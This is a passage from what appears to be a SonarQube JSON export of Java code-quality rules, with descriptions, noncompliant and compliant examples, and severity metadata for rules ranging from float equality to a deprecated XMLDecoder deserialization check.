stored\nvalue and the expected value against a margin of acceptable error. Note that this does not cover all cases (<code>NaN</code> and <code>Infinity</code>\nfor instance).</p>\n<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfloat myNumber = 3.146;\nif ( myNumber == 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be false\n  // ...\n}\nif ( myNumber != 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be true\n  // ...\n}\n\nif (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant; indirect inequality test\n  // ...\n}\n\nfloat zeroFloat = 0.0f;\nif (zeroFloat == 0) {  // Noncompliant. Computations may end up with a value close but not equal to zero.\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Since <code>NaN</code> is not equal to itself, the specific case of testing a floating point value against itself is a valid test for\n<code>NaN</code> and is therefore ignored. Though using <code>Double.isNaN</code> method should be preferred instead, as intent is more explicit.</p>\n<pre>\nfloat f;\ndouble d;\nif(f != f) { // Compliant; test for NaN value\n  System.out.println(\"f is NaN\");\n} else if (f != d) { // Noncompliant\n  // ...\n}\n</pre>",
            "mdDesc": "<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is\nnot associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be\ndifferent based on the order of those operation because of the rounding that takes place at each step.</p>\n<p>Even simple floating point assignments are not simple:</p>\n<pre>\nfloat f = 0.1; // 0.100000001490116119384765625\ndouble d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625\n</pre>\n<p>(Results will vary based on compiler and compiler settings);</p>\n<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values\nis almost always an error. Instead the best course is to avoid floating point comparisons altogether. When that is not possible, you should consider\nusing one of Java's float-handling <code>Numbers</code> such as <code>BigDecimal</code> which can properly handle floating point comparisons. A third\noption is to look not for equality but for whether the value is close enough. I.e. compare the absolute value of the difference between the stored\nvalue and the expected value against a margin of acceptable error. Note that this does not cover all cases (<code>NaN</code> and <code>Infinity</code>\nfor instance).</p>\n<p>This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfloat myNumber = 3.146;\nif ( myNumber == 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be false\n  // ...\n}\nif ( myNumber != 3.146f ) { //Noncompliant. Because of floating point imprecision, this will be true\n  // ...\n}\n\nif (myNumber &lt; 4 || myNumber &gt; 4) { // Noncompliant; indirect inequality test\n  // ...\n}\n\nfloat zeroFloat = 0.0f;\nif (zeroFloat == 0) {  // Noncompliant. Computations may end up with a value close but not equal to zero.\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Since <code>NaN</code> is not equal to itself, the specific case of testing a floating point value against itself is a valid test for\n<code>NaN</code> and is therefore ignored. Though using <code>Double.isNaN</code> method should be preferred instead, as intent is more explicit.</p>\n<pre>\nfloat f;\ndouble d;\nif(f != f) { // Compliant; test for NaN value\n  System.out.println(\"f is NaN\");\n} else if (f != d) { // Noncompliant\n  // ...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3420",
            "repo": "java",
            "name": "Artifact ids should follow a naming convention",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a pom's <code>artifactId</code> does not match the\nprovided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression: <code>[a-z][a-z-0-9]+</code></p>\n<pre>\n&lt;project ...&gt;\n  &lt;artifactId&gt;My_Project&lt;/artifactId&gt;  &lt;!-- Noncompliant --&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;project ...&gt;\n  &lt;artifactId&gt;my-project&lt;/artifactId&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>",
            "mdDesc": "<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a pom's <code>artifactId</code> does not match the\nprovided regular expression.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default regular expression: <code>[a-z][a-z-0-9]+</code></p>\n<pre>\n&lt;project ...&gt;\n  &lt;artifactId&gt;My_Project&lt;/artifactId&gt;  &lt;!-- Noncompliant --&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;project ...&gt;\n  &lt;artifactId&gt;my-project&lt;/artifactId&gt;\n\n  &lt;!-- ... --&gt;\n&lt;/project&gt;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention",
                "maven"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "regex",
                    "htmlDesc": "The regular expression the &quot;artifactId&quot; should match",
                    "defaultValue": "[a-z][a-z-0-9]+",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2694",
            "repo": "java",
            "name": "Inner classes which do not reference their owning classes should be \"static\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A non-static inner class has a reference to its outer class, and access to the outer class' fields and methods. That class reference makes the\ninner class larger and could cause the outer class instance to live in memory longer than necessary. </p>\n<p>If the reference to the outer class isn't used, it is more efficient to make the inner class <code>static</code> (also called nested). If the\nreference is used only in the class constructor, then explicitly pass a class reference to the constructor. If the inner class is anonymous, it will\nalso be necessary to name it. </p>\n<p>However, while a nested/<code>static</code> class would be more efficient, it's worth noting that there are semantic differences between an inner\nclass and a nested one:</p>\n<ul>\n  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>\n  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n  // ...\n\n  public class Seed {  // Noncompliant; there's no use of the outer class reference so make it static\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit {\n  // ...\n\n  public static class Seed {\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>A non-static inner class has a reference to its outer class, and access to the outer class' fields and methods. That class reference makes the\ninner class larger and could cause the outer class instance to live in memory longer than necessary. </p>\n<p>If the reference to the outer class isn't used, it is more efficient to make the inner class <code>static</code> (also called nested). If the\nreference is used only in the class constructor, then explicitly pass a class reference to the constructor. If the inner class is anonymous, it will\nalso be necessary to name it. </p>\n<p>However, while a nested/<code>static</code> class would be more efficient, it's worth noting that there are semantic differences between an inner\nclass and a nested one:</p>\n<ul>\n  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>\n  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n  // ...\n\n  public class Seed {  // Noncompliant; there's no use of the outer class reference so make it static\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit {\n  // ...\n\n  public static class Seed {\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5960",
            "repo": "java",
            "name": "Assertions should not be used in production code",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Assertions are intended to be used in <strong>test</strong> code, but not in <strong>production</strong> code. It is confusing, and might lead to\n<code>ClassNotFoundException</code> when the build tools only provide the required dependency in test scope.</p>\n<p> In addition, assertions will throw a sub-class of <code>Error</code>: <code>AssertionError</code>, which should be avoided in production code.</p>\n<p>This rule raises an issue when any assertion intended to be used in test is used in production code.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit </li>\n  <li> FestAssert </li>\n  <li> AssertJ </li>\n</ul>\n<p>Note: this does not apply for <code>assert</code> from Java itself or if the source code package name is related to tests (contains:\n<code>test</code> or <code>assert</code> or <code>junit</code>).</p>",
            "mdDesc": "<p>Assertions are intended to be used in <strong>test</strong> code, but not in <strong>production</strong> code. It is confusing, and might lead to\n<code>ClassNotFoundException</code> when the build tools only provide the required dependency in test scope.</p>\n<p> In addition, assertions will throw a sub-class of <code>Error</code>: <code>AssertionError</code>, which should be avoided in production code.</p>\n<p>This rule raises an issue when any assertion intended to be used in test is used in production code.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit </li>\n  <li> FestAssert </li>\n  <li> AssertJ </li>\n</ul>\n<p>Note: this does not apply for <code>assert</code> from Java itself or if the source code package name is related to tests (contains:\n<code>test</code> or <code>assert</code> or <code>junit</code>).</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2695",
            "repo": "java",
            "name": "\"PreparedStatement\" and \"ResultSet\" methods should be called with valid indices",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The parameters in a <code>PreparedStatement</code> are numbered from 1, not 0, so using any \"set\" method of a <code>PreparedStatement</code> with a\nnumber less than 1 is a bug, as is using an index higher than the number of parameters. Similarly, <code>ResultSet</code> indices also start at 1,\nrather than 0</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPreparedStatement ps = con.prepareStatement(\"SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?\");\nps.setDate(0, date);  // Noncompliant\nps.setDouble(3, salary);  // Noncompliant\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(0);  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPreparedStatement ps = con.prepareStatement(\"SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?\");\nps.setDate(1, date);\nps.setDouble(2, salary);\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(1);\n  // ...\n}\n</pre>",
            "mdDesc": "<p>The parameters in a <code>PreparedStatement</code> are numbered from 1, not 0, so using any \"set\" method of a <code>PreparedStatement</code> with a\nnumber less than 1 is a bug, as is using an index higher than the number of parameters. Similarly, <code>ResultSet</code> indices also start at 1,\nrather than 0</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPreparedStatement ps = con.prepareStatement(\"SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?\");\nps.setDate(0, date);  // Noncompliant\nps.setDouble(3, salary);  // Noncompliant\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(0);  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPreparedStatement ps = con.prepareStatement(\"SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?\");\nps.setDate(1, date);\nps.setDouble(2, salary);\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(1);\n  // ...\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "sql"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3421",
            "repo": "java",
            "name": "Deprecated \"${pom}\" properties should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Deprecated features are those that have been retained temporarily for backward compatibility, but which will eventually be removed. In effect,\ndeprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no use of the deprecated\nfeatures should be added, and all existing uses should be gradually removed.</p>\n<p>This rule raises an issue when <code>${pom.*}</code> properties are used in a pom.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${pom.artifactId}-${pom.version}&lt;/finalName&gt;  &lt;!-- Noncompliant --&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${project.artifactId}-${project.version}&lt;/finalName&gt;\n</pre>\n<p>or</p>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${artifactId}-${version}&lt;/finalName&gt;\n</pre>",
            "mdDesc": "<p>Deprecated features are those that have been retained temporarily for backward compatibility, but which will eventually be removed. In effect,\ndeprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no use of the deprecated\nfeatures should be added, and all existing uses should be gradually removed.</p>\n<p>This rule raises an issue when <code>${pom.*}</code> properties are used in a pom.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${pom.artifactId}-${pom.version}&lt;/finalName&gt;  &lt;!-- Noncompliant --&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${project.artifactId}-${project.version}&lt;/finalName&gt;\n</pre>\n<p>or</p>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${artifactId}-${version}&lt;/finalName&gt;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "maven",
                "obsolete"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1121",
            "repo": "java",
            "name": "Assignments should not be made from within sub-expressions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have\nside-effects.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant\n  //...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr = cont.substring(pos1, pos2);\nif (str.isEmpty()) {\n  //...\n</pre>\n<h2>Exceptions</h2>\n<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are ignored.</p>\n<pre>\nBufferedReader br = new BufferedReader(/* ... */);\nString line;\nwhile ((line = br.readLine()) != null) {...}\n</pre>\n<p>Chained assignments, including compound assignments, are ignored.</p>\n<pre>\nint i = j = 0;\nint k = (j += 1);\nresult = (bresult = new byte[len]);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/481.html\">MITRE, CWE-481</a> - Assigning instead of Comparing </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ZNYxBQ\">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITZGBQ\">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions </li>\n</ul>",
            "mdDesc": "<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have\nside-effects.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant\n  //...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr = cont.substring(pos1, pos2);\nif (str.isEmpty()) {\n  //...\n</pre>\n<h2>Exceptions</h2>\n<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are ignored.</p>\n<pre>\nBufferedReader br = new BufferedReader(/* ... */);\nString line;\nwhile ((line = br.readLine()) != null) {...}\n</pre>\n<p>Chained assignments, including compound assignments, are ignored.</p>\n<pre>\nint i = j = 0;\nint k = (j += 1);\nresult = (bresult = new byte[len]);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/481.html\">MITRE, CWE-481</a> - Assigning instead of Comparing </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ZNYxBQ\">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITZGBQ\">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2211",
            "repo": "java",
            "name": "Types should be used in lambdas",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared coding conventions allow teams to collaborate effectively. While types for lambda arguments are optional, specifying them anyway makes the\ncode clearer and easier to read.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nArrays.sort(rosterAsArray,\n    (a, b) -&gt; {  // Noncompliant\n        return a.getBirthday().compareTo(b.getBirthday());\n    }\n);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nArrays.sort(rosterAsArray,\n    (Person a, Person b) -&gt; {\n        return a.getBirthday().compareTo(b.getBirthday());\n    }\n);\n</pre>\n<h2>Exceptions</h2>\n<p>When the lambda has one or two parameters and does not have a block this rule will not fire up an issue as things are considered more readable in\nthose cases.</p>\n<pre>\nstream.map((a, b) -&gt; a.length); // compliant\n</pre>",
            "mdDesc": "<p>Shared coding conventions allow teams to collaborate effectively. While types for lambda arguments are optional, specifying them anyway makes the\ncode clearer and easier to read.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nArrays.sort(rosterAsArray,\n    (a, b) -&gt; {  // Noncompliant\n        return a.getBirthday().compareTo(b.getBirthday());\n    }\n);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nArrays.sort(rosterAsArray,\n    (Person a, Person b) -&gt; {\n        return a.getBirthday().compareTo(b.getBirthday());\n    }\n);\n</pre>\n<h2>Exceptions</h2>\n<p>When the lambda has one or two parameters and does not have a block this rule will not fire up an issue as things are considered more readable in\nthose cases.</p>\n<pre>\nstream.map((a, b) -&gt; a.length); // compliant\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention",
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4510",
            "repo": "java",
            "name": "Deserializing with XMLDecoder is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Deserialization from an untrusted source using the XMLDecoder library can lead to unexpected code execution. For example, it has led in the past to\nthe following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4221\">CVE-2013-4221</a> </li>\n</ul>\n<p>XMLDecoder supports arbitrary method invocation. This capability is intended to call setter methods only but nothing prevents the execution of any\nother method.</p>\n<p>This rule raises an issue when XMLDecoder is instantiated. The call to \"readObject\" is also highlighted to show where the malicious code can be\nexecuted.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the XML input can come from an untrusted source and be tainted by a hacker. (*) </li>\n  <li> you require the advanced functionalities provided by the XMLDecoder class. If you simply need to deserialize XML you can use a more secure\n  deserialization function. </li>\n</ul>\n<p>(*) You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>If you only need a simple deserialization, use instead one of the deserialization libraries <a\nhref=\"https://www.owasp.org/index.php/Deserialization_Cheat_Sheet#Mitigation_Tools.2FLibraries\">recommended by OWASP</a>.</p>\n<p>If you really need to use XMLDecoder, make sure that the serialized data cannot be tampered with.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic void decode(InputStream in) {\n  XMLDecoder d = new XMLDecoder(in); // Sensitive\n  Object result = d.readObject();\n  [...]\n  d.close();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Deserialization_of_untrusted_data\">OWASP Deserialization of untrusted data</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#XML_DECODER\">XML_DECODER </a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Deserialization from an untrusted source using the XMLDecoder library can lead to unexpected code execution. For example, it has led in the past to\nthe following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4221\">CVE-2013-4221</a> </li>\n</ul>\n<p>XMLDecoder supports arbitrary method invocation. This capability is intended to call setter methods only but nothing prevents the execution of any\nother method.</p>\n<p>This rule raises an issue when XMLDecoder is instantiated. The call to \"readObject\" is also highlighted to show where the malicious code can be\nexecuted.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the XML input can come from an untrusted source and be tainted by a hacker. (*) </li>\n  <li> you require the advanced functionalities provided by the XMLDecoder class. If you simply need to deserialize XML you can use a more secure\n  deserialization function. </li>\n</ul>\n<p>(*) You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>If you only need a simple deserialization, use instead one of the deserialization libraries <a\nhref=\"https://www.owasp.org/index.php/Deserialization_Cheat_Sheet#Mitigation_Tools.2FLibraries\">recommended by OWASP</a>.</p>\n<p>If you really need to use XMLDecoder, make sure that the serialized data cannot be tampered with.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic void decode(InputStream in) {\n  XMLDecoder d = new XMLDecoder(in); // Sensitive\n  Object result = d.readObject();\n  [...]\n  d.close();\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Deserialization_of_untrusted_data\">OWASP Deserialization of untrusted data</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#XML_DECODER\">XML_DECODER </a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S5841",
            "repo": "java",
            "name": "AssertJ assertions \"allMatch\" and \"doesNotContains\" should also test for emptiness",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>AssertJ assertions <code>allMatch</code> and <code>doesNotContains</code> on an empty list always&nbsp;returns true whatever the content of the\npredicate. Despite being correct, you should make explicit if you expect an empty list or not, by adding\n<code>isEmpty()</code>/<code>isNotEmpty()</code> in addition to calling the assertion, or by testing the list's content further. It will justify the\nuseless predicate to improve clarity or increase the reliability of the test.</p>\n<p>This rule raises an issue when any of the methods listed are used without asserting that the list is empty or not and without testing the\ncontent.</p>\n<p>Targetted methods:</p>\n<ul>\n  <li> <code>allMatch</code> </li>\n  <li> <code>allSatisfy</code> </li>\n  <li> <code>doesNotContain</code> </li>\n  <li> <code>doesNotContainSequence</code> </li>\n  <li> <code>doesNotContainSubsequence</code> </li>\n  <li> <code>doesNotContainAnyElementsOf</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;String&gt; logs = getLogs();\n\nassertThat(logs).allMatch(e -&gt; e.contains(“error”)); // Noncompliant, this test pass if logs are empty!\nassertThat(logs).doesNotContain(\"error\"); // Noncompliant, do you expect any log?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; logs = getLogs();\n\nassertThat(logs).isNotEmpty().allMatch(e -&gt; e.contains(“error”));\n// Or\nassertThat(logs).hasSize(5).allMatch(e -&gt; e.contains(“error”));\n// Or\nassertThat(logs).isEmpty();\n\n// Despite being redundant, this is also acceptable since it explains why you expect an empty list\nassertThat(logs).doesNotContain(\"error\").isEmpty();\n// or test the content of the list further\nassertThat(logs).contains(\"warning\").doesNotContain(\"error\");\n</pre>",
